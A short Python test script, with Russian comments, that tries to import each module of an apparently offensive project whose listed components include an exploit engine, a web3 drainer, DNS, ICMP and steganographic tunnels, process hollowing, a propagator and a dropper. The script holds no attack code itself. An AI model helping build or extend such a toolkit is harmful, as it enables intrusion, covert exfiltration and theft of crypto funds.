# scripts/test_imports.py
import sys
import os
import importlib
import traceback

# Добавляем корневую директорию проекта в PYTHONPATH, чтобы работали импорты вида src.module
project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, project_root)

print(f"Project root added to PYTHONPATH: {project_root}")
print("-" * 30)

# Список модулей для проверки (относительно src)
# Добавляй сюда другие важные модули по мере необходимости
modules_to_test = [
    "main",
    "exploit_manager",
    "exploit_engine",
    "host_scanner",
    "vulnerability_scanner",
    "service_detector",
    "port_scanner",
    "autonomous_agent",
    "autonomous_contract_scanner",
    "report_generator", # Добавил, т.к. используется в vulnerability_scanner
    "web_scanner", # Добавил, т.к. используется в vulnerability_scanner
    "celery_app", # Проверим наличие
    "tasks", # Проверим наличие
    "modules.dns_tunnel",
    "modules.https_tunnel",
    "modules.icmp_tunnel",
    "modules.web3_drainer",
    "modules.web3_contract_analyzer",
    "modules.stego_tunnel",
    "modules.process_hollowing",
    "modules.propagator",
    "modules.dropper",
    # Добавь сюда другие модули, если нужно
]

all_passed = True

for module_name in modules_to_test:
    full_module_path = f"src.{module_name}"
    print(f"Testing import: {full_module_path}")
    try:
        importlib.import_module(full_module_path)
        print(f"  [ OK ] Imported successfully.")
    except ModuleNotFoundError as e:
        print(f"  [FAIL] ModuleNotFoundError: {e}")
        # traceback.print_exc() # Раскомментируй для полного стека
        all_passed = False
    except ImportError as e:
        print(f"  [FAIL] ImportError: {e}")
        # traceback.print_exc() # Раскомментируй для полного стека
        all_passed = False
    except Exception as e:
        print(f"  [FAIL] Unexpected error during import: {e}")
        traceback.print_exc()
        all_passed = False
    print("-" * 30)

if all_passed:
    print("All basic imports passed successfully!")
    sys.exit(0)
else:
    print("Some imports failed. Please check the logs above.")
    sys.exit(1) 